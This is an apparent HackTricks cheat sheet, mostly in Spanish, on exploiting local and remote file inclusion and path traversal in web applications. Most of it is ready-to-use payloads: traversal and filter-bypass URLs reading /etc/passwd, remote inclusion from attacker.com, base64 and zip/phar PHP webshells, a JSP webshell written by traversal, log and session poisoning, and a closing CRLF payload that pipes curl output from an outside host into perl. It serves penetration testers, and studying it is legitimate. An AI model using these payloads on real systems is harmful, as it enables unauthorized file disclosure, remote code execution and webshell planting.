# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** El archivo se carga desde un servidor remoto (Lo mejor: puedes escribir el código y el servidor lo ejecutará). En php esto está **deshabilitado** por defecto (**allow_url_include**).\
**Local File Inclusion (LFI):** El servidor carga un archivo local.

La vulnerabilidad ocurre cuando el usuario puede controlar de alguna manera el archivo que el servidor va a cargar.

Funciones **PHP** vulnerables: require, require_once, include, include_once

Una herramienta interesante para explotar esta vulnerabilidad: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Combinando varias listas LFI de \*nix y añadiendo más rutas he creado esta:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Prueba también a cambiar `/` por `\`\
Prueba también a añadir `../../../../../`

Una lista que usa varias técnicas para encontrar el archivo /etc/password (para comprobar si la vulnerabilidad existe) se puede encontrar [aquí](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Fusión de diferentes wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Prueba también a cambiar `/` por `\`\
Prueba también a eliminar `C:/` y añadir `../../../../../`

Una lista que usa varias técnicas para encontrar el archivo /boot.ini (para comprobar si la vulnerabilidad existe) se puede encontrar [aquí](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Revisa la lista LFI de Linux.

## LFI básico y bypasses

Todos los ejemplos son para Local File Inclusion pero también podrían aplicarse a Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Secuencias traversal eliminadas de forma no recursiva
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass para evitar la adición de más caracteres al final de la cadena proporcionada (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Esto está **resuelto desde PHP 5.4**

### **Codificación**

Podrías usar codificaciones no estándar como double URL encode (y otras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Desde una carpeta existente

Quizás el back-end está comprobando la ruta de la carpeta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorando directorios del sistema de archivos en un servidor

El sistema de archivos de un servidor puede explorarse recursivamente para identificar directorios, no solo archivos, empleando ciertas técnicas. Este proceso implica determinar la profundidad de directorio y sondar la existencia de carpetas específicas. A continuación se presenta un método detallado para lograr esto:

1. **Determine Directory Depth:** Averigüe la profundidad de su directorio actual obteniendo con éxito el archivo `/etc/passwd` (aplicable si el servidor está basado en Linux). Una URL de ejemplo podría estructurarse de la siguiente manera, indicando una profundidad de tres:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondear carpetas:** Añade el nombre de la carpeta sospechosa (p. ej., `private`) a la URL, luego vuelve a `/etc/passwd`. El nivel adicional de directorio requiere incrementar la profundidad en uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretar los resultados:** La respuesta del servidor indica si el directorio existe:
- **Error / Sin salida:** El directorio `private` probablemente no existe en la ubicación especificada.
- **Contenido de `/etc/passwd`:** Se confirma la presencia del directorio `private`.
4. **Exploración recursiva:** Los directorios descubiertos pueden explorarse más a fondo para buscar subdirectorios o archivos usando la misma técnica o los métodos tradicionales de Local File Inclusion (LFI).

Para explorar directorios en distintas ubicaciones del sistema de archivos, ajusta el payload en consecuencia. Por ejemplo, para comprobar si `/var/www/` contiene un directorio `private` (suponiendo que el directorio actual está a una profundidad de 3), usa:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation es un método empleado para manipular rutas de archivos en aplicaciones web. A menudo se usa para acceder a archivos restringidos sorteando ciertas medidas de seguridad que añaden caracteres adicionales al final de las rutas. El objetivo es construir una ruta que, una vez alterada por la medida de seguridad, siga apuntando al archivo deseado.

En PHP, varias representaciones de una ruta de archivo pueden considerarse equivalentes debido a la naturaleza del sistema de archivos. Por ejemplo:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Cuando los últimos 6 caracteres son `passwd`, añadir un `/` (convirtiéndolo en `passwd/`) no cambia el archivo objetivo.
- De manera similar, si se añade `.php` a una ruta (como `shellcode.php`), agregar `/.` al final no alterará el archivo al que se accede.

Los ejemplos proporcionados muestran cómo utilizar path truncation para acceder a `/etc/passwd`, un objetivo común debido a su contenido sensible (información de cuentas de usuario):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
En estos escenarios, el número de traversals necesarios podría ser aproximadamente 2027, pero este número puede variar según la configuración del servidor.

- **Using Dot Segments and Additional Characters**: Las secuencias de traversal (`../`) combinadas con segmentos adicionales de puntos y caracteres pueden usarse para navegar el sistema de archivos, ignorando efectivamente cadenas añadidas por el servidor.
- **Determining the Required Number of Traversals**: Mediante prueba y error, se puede encontrar el número exacto de secuencias `../` necesarias para llegar al directorio raíz y luego a `/etc/passwd`, asegurando que cualquier cadena añadida (como `.php`) sea neutralizada pero la ruta deseada (`/etc/passwd`) permanezca intacta.
- **Starting with a Fake Directory**: Es práctica común comenzar la ruta con un directorio inexistente (como `a/`). Esta técnica se usa como medida de precaución o para satisfacer los requisitos de la lógica de análisis de rutas del servidor.

Al emplear técnicas de path truncation, es crucial entender el comportamiento del análisis de rutas del servidor y la estructura del sistema de archivos. Cada escenario puede requerir un enfoque distinto, y a menudo es necesario realizar pruebas para encontrar el método más efectivo.

**Esta vulnerabilidad fue corregida en PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

En php esto está deshabilitado por defecto porque **`allow_url_include`** está **Off.** Debe estar **On** para que funcione, y en ese caso podrías incluir un archivo PHP desde tu servidor y obtener RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si por alguna razón **`allow_url_include`** está **On**, pero PHP está **filtering** el acceso a páginas web externas, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), podrías usar, por ejemplo, el protocolo data con base64 para decodificar un código PHP b64 y obtener RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> En el código anterior, el `+.txt` final se añadió porque el atacante necesitaba una cadena que terminara en `.txt`, así que la cadena termina con ello y después del b64 decode esa parte devolverá solo datos basura y el código PHP real será incluido (y por lo tanto, ejecutado).

Otro ejemplo **sin usar el protocolo `php://`** sería:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Elemento raíz

En Python, en un código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si el usuario pasa una **ruta absoluta** a **`file_name`**, la **ruta anterior simplemente se elimina**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es el comportamiento previsto según [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Si un componente es una ruta absoluta, se descartan todos los componentes anteriores y la unión continúa desde el componente de ruta absoluta.

## Listado de directorios en Java

Parece que si tienes un Path Traversal en Java y **solicitas un directorio** en lugar de un archivo, se devuelve un **listado del directorio**. Esto no ocurre en otros lenguajes (que yo sepa).

## Top 25 parámetros

Aquí tienes una lista de los 25 parámetros principales que podrían ser vulnerables a local file inclusion (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando PHP wrappers y protocolos

### php://filter

Los filtros de PHP permiten realizar operaciones básicas de **modificación sobre los datos** antes de que sean leídos o escritos. Hay 5 categorías de filtros:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Elimina etiquetas de los datos (todo lo que esté entre los caracteres "<" y ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . Para obtener la **lista de todas las codificaciones** soportadas, ejecuta en la consola: `iconv -l`

> [!WARNING]
> Abusando del filtro de conversión `convert.iconv.*` puedes **generar texto arbitrario**, lo cual puede ser útil para escribir texto arbitrario o hacer que una función como include procese texto arbitrario. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Comprime el contenido (útil si vas a exfiltrar mucha información)
- `zlib.inflate`: Descomprime los datos
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecado
- `mdecrypt.*` : Deprecado
- Other Filters
- Ejecutando en php `var_dump(stream_get_filters());` puedes encontrar un par de **filtros inesperados**:
- `consumed`
- `dechunk`: revierte la codificación chunked de HTTP
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> La parte "php://filter" no distingue entre mayúsculas y minúsculas

### Uso de php filters como oracle para leer archivos arbitrarios

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) is proposed a technique to read a local file without having the output given back from the server. This technique is based on a **boolean exfiltration of the file (char by char) using php filters** as oracle. This is because php filters can be used to make a text larger enough to make php throw an exception.

In the original post you can find a detailed explanation of the technique, but here is a quick summary:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the beginning and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beginning of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **más datos** the idea is to **generar 2 bytes de datos basura al principio** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot con los siguientes 2 bytes**, and **eliminar los datos hasta los datos basura** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the desired bit to leak.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
También puedes usar **php://stdin, php://stdout and php://stderr** para acceder a los **descriptores de archivo 0, 1 y 2** respectivamente (no estoy seguro de cómo esto podría ser útil en un ataque)

### zip:// and rar://

Sube un archivo Zip o Rar con un PHPShell dentro y accede a él.\
Para poder abusar del protocolo rar **debe ser activado específicamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Ten en cuenta que este protocolo está restringido por las configuraciones de php **`allow_url_open`** y **`allow_url_include`**

### expect://

Expect debe estar activado. Puedes ejecutar código usando esto:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique su payload en los parámetros POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un archivo `.phar` puede utilizarse para ejecutar código PHP cuando una aplicación web emplea funciones tales como `include` para cargar archivos. El fragmento de código PHP mostrado a continuación demuestra la creación de un archivo `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Para compilar el archivo `.phar`, se debe ejecutar el siguiente comando:
```bash
php --define phar.readonly=0 create_path.php
```
Al ejecutarlo, se creará un archivo llamado `test.phar`, que podría aprovecharse para explotar vulnerabilidades de Local File Inclusion (LFI).

En casos donde la LFI solo realiza lectura de archivos sin ejecutar el código PHP contenido, mediante funciones como `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, o `filesize()`, podría intentarse explotar una vulnerabilidad de deserialization. Esta vulnerabilidad está asociada con la lectura de archivos usando el protocolo `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of a specific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escribe en memoria o en un archivo temporal (no estoy seguro de cómo esto puede ser útil en un ataque de file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Acceso al sistema de archivos local
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Acceso a URLs HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acceso a URLs FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Flujos de compresión
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Buscar nombres de ruta que coincidan con un patrón (No devuelve nada imprimible, por lo que no es realmente útil aquí)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Flujos de audio (No útil para leer archivos arbitrarios)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) risks in PHP are notably high when dealing with the 'assert' function, which can execute code within strings. This is particularly problematic if input containing directory traversal characters like ".." is being checked but not properly sanitized.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Aunque esto tiene como objetivo detener traversal, crea involuntariamente un vector para code injection. Para explotar esto y leer el contenido de archivos, un atacante podría usar:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
De manera similar, para ejecutar comandos arbitrarios del sistema, se podría usar:
```plaintext
' and die(system("id")) or '
```
Es importante **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Esta técnica es relevante en casos donde **controlas** la **file path** de una **PHP function** que **access a file** pero no verás el contenido del archivo (como una simple llamada a **`file()`**) ya que el contenido no se muestra.

En [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) se explica cómo un blind path traversal puede abusarse vía PHP filter para **exfiltrate the content of a file via an error oracle**.

En resumen, la técnica usa la **"UCS-4LE" encoding** para hacer que el contenido de un archivo sea tan **big** que la **PHP function opening** el archivo provocará un **error**.

Luego, para leak the first char se usa el filter **`dechunk`** junto con otros como **base64** o **rot13**, y finalmente los filtros **convert.iconv.UCS-4.UCS-4LE** y **convert.iconv.UTF16.UTF-16BE** se usan para **place other chars at the beggining and leak them**.

**Funciones que podrían ser vulnerables**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo objetivo de solo lectura con esto)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para los detalles técnicos consulta el post mencionado!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Cuando el código del lado del servidor que ingiere/sube archivos construye la ruta de destino usando datos controlados por el usuario (p. ej., un filename o URL) sin canonicalizar y validar, los segmentos `..` y las rutas absolutas pueden escapar del directorio previsto y causar una escritura arbitraria de archivos. Si puedes colocar el payload bajo un directorio expuesto en la web, normalmente obtendrás RCE no autenticada al desplegar una webshell.

Flujo típico de explotación:
- Identificar una primitive de escritura en un endpoint o background worker que acepte un path/filename y escriba contenido en disco (p. ej., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determinar directorios expuestos en la web. Ejemplos comunes:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Construir una ruta de traversal que salga del directorio de almacenamiento previsto hacia el webroot, e incluir el contenido de tu webshell.
- Accede al payload dejado y ejecuta comandos.

Notas:
- El servicio vulnerable que realiza la escritura puede escuchar en un puerto no HTTP (p. ej., un JMF XML listener en TCP 4004). El portal web principal (otro puerto) servirá más tarde tu payload.
- En stacks Java, estas escrituras de archivos a menudo se implementan con concatenación simple de `File`/`Paths`. La falta de canonicalización/allow-listing es la falla principal.

Ejemplo genérico estilo XML/JMF (los esquemas de producto varían – el DOCTYPE/body wrapper es irrelevante para el traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Medidas de hardening que mitigan esta clase de fallos:
- Resolver a una ruta canónica y verificar que sea descendiente de un directorio base en la lista de permitidos.
- Rechazar cualquier ruta que contenga `..`, raíces absolutas, o letras de unidad; preferir nombres de archivo generados.
- Ejecutar el writer con una cuenta de bajos privilegios y segregar los directorios de escritura de los roots servidos.

## Remote File Inclusion

Explicado anteriormente, [**sigue este enlace**](#remote-file-inclusion).

### Via Apache/Nginx log file

Si el servidor Apache o Nginx es **vulnerable a LFI** dentro de la función include podrías intentar acceder a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, insertar en el **user agent** o en un **parámetro GET** un php shell como **`<?php system($_GET['c']); ?>`** e incluir ese archivo

> [!WARNING]
> Ten en cuenta que **si usas comillas dobles** para el shell en lugar de **comillas simples**, las comillas dobles se convertirán en la cadena "_**quote;**_", **PHP lanzará un error** allí y **nada más se ejecutará**.
>
> Además, asegúrate de **escribir correctamente el payload** o PHP fallará cada vez que intente cargar el archivo de logs y no tendrás una segunda oportunidad.

Esto también puede hacerse en otros logs pero **ten cuidado,** el código dentro de los logs podría estar codificado en URL y eso podría destruir el Shell. El encabezado **authorisation "basic"** contiene "user:password" en Base64 y se decodifica dentro de los logs. El PHPShell podría insertarse dentro de este encabezado.\
Otros posibles paths de logs:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Vía correo electrónico

**Envía un correo** a una cuenta interna (user@localhost) que contenga tu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e intenta incluirlo en el correo del usuario con una ruta como **`/var/mail/<USERNAME>`** o **`/var/spool/mail/<USERNAME>`**

### A través de /proc/*/fd/*

1. Sube muchas shells (por ejemplo: 100)
2. Incluye [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), con $PID = PID del proceso (puede ser brute forced) y $FD = descriptor de archivo (también puede ser brute forced)

### A través de /proc/self/environ

Como en un archivo de log, envía el payload en el User-Agent; será reflejado dentro del archivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Mediante upload

Si puedes upload un archivo, simplemente inyecta el shell payload en él (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para mantener el archivo legible es mejor inyectarlo en los metadatos de las imágenes/doc/pdf

### Mediante la subida de un archivo ZIP

Sube un archivo ZIP que contenga un PHP shell comprimido y accede:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Mediante PHP sessions

Comprueba si el sitio web utiliza PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP estas sesiones se almacenan en _/var/lib/php5/sess\\_\[PHPSESSID]\_ archivos
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Establece la cookie en `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Usa el LFI para incluir el archivo de sesión de PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Vía ssh

Si ssh está activo, verifica qué usuario se está usando (/proc/self/status & /etc/passwd) e intenta acceder a **\<HOME>/.ssh/id_rsa**

### **Vía** **vsftpd** _**registros**_

Los registros del servidor FTP vsftpd se encuentran en _**/var/log/vsftpd.log**_. En el escenario en el que exista una vulnerabilidad de Local File Inclusion (LFI), y sea posible acceder a un servidor vsftpd expuesto, se pueden considerar los siguientes pasos:

1. Inyecta un PHP payload en el campo de nombre de usuario durante el proceso de inicio de sesión.
2. Tras la inyección, utiliza la LFI para recuperar los registros del servidor desde _**/var/log/vsftpd.log**_.

### Vía php base64 filter (usando base64)

Como se muestra en [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artículo, PHP base64 filter simplemente ignora lo que no es base64. Puedes usar eso para bypass la verificación de la extensión de archivo: si suministras base64 que termina con ".php", simplemente ignoraría el "." y concatenaría "php" al base64. Aquí hay un ejemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Mediante php filters (no se necesita archivo)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que puedes usar **php filters to generate arbitrary content** como salida. Lo que básicamente significa que puedes **generate arbitrary php code** para el include **without needing to write** it en un archivo.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Mediante segmentation fault

**Upload** un archivo que será almacenado como **temporary** en `/tmp`, luego en la **same request,** provoca un **segmentation fault**, y entonces el **temporary file won't be deleted** y puedes buscarlo.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Mediante Nginx temp file storage

Si encuentras una **Local File Inclusion** y **Nginx** está ejecutándose frente a PHP podrías obtener RCE con la siguiente técnica:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Mediante PHP_SESSION_UPLOAD_PROGRESS

Si encuentras una **Local File Inclusion** incluso si **no tienes una session** y `session.auto_start` está `Off`. Si provees el **`PHP_SESSION_UPLOAD_PROGRESS`** en datos **multipart POST**, PHP **enable the session for you**. Podrías abusar de esto para obtener RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Mediante temp file uploads in Windows

Si encuentras una **Local File Inclusion** y el servidor está ejecutándose en **Windows** podrías conseguir RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Mediante `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), el script `/usr/local/lib/phppearcmd.php` existe por defecto en php docker images. Moreover, es posible pasar argumentos al script vía la URL porque se indica que si un parámetro de URL no tiene un `=`, debería usarse como argumento. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Lo siguiente abusa de una CRLF vuln para obtener RCE (desde [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
